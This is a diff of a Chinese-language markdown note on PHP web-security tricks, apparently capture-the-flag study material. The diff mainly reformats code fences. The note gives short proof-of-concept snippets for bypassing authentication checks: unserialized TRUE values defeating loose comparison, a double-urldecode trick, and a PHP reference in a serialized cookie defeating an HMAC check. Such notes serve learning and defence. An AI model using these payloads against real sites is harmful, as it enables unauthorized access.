@@ -66,7 +66,7 @@ user, pass 的值是未知的，条件判断时使 $data_unserialize['user']=tru
 
 * poc
 
-'''php
+```php
 $arr =  array();
 $arr['user']=TRUE;
 $arr['pass']=TRUE;
@@ -77,28 +77,30 @@ if($data_unserialize['user'] == '???' && $data_unserialize['pass']=='???')
 {
     print_r($flag);
 }
-'''
+```
 
 ## urldecode
 
 > string urldecode() 返回字符串类型 
 
 urldecode 与 $_GET[] $_POST[] $_REQEST[] 联合使用
+
 $_GET[] $_POST[] $_REQEST[] 返回的参数是**已经被解码了**的，在进行 urldecode 相当于 二次 urldecode
 
 * poc
 
-'''php
+```php
 $username = $_GET['username'];  //url: ...?username=%2561dmin   %61 is a
 if (urldecode($username) === "admin"){
     echo "you are admin";
 }
-'''
+```
+
 ## reference
 
 * example
 
-'''php
+```php
 $auth = $_COOKIE['auth'];
 if(get_magic_quotes_gpc())
     $auth = stripslashes($auth);
@@ -111,18 +113,20 @@ $auth['hmac_t'] = sha1(sha1($auth['username'].$auth['hmac_t'].$auth['password'])
 
 if($auth['hmac_t'] !== $auth['hmac'])
     return false;
-'''
+```
 
 * poc
 
-'''php
+```php
 $a = array("username" => "dragon", "password" => true, "hmac_t" => "0"); 
 $a["hmac"] = &$a["hmac_t"]; // key point ****************
 $a["hmac_t"]=1; 
 echo $a["hmac"]."\n";
 echo urlencode(serialize($a)) . "\n";
-'''
+```
 
 1.**PHP 是可以直接取 Reference **
+
 则 if !== 的 strict comparison 就 always true 了...因为都是一个** Object **
+
 2.cookie 提交 auth 为 urlencode(serialize($a)) 或 serialize($a) 均可 
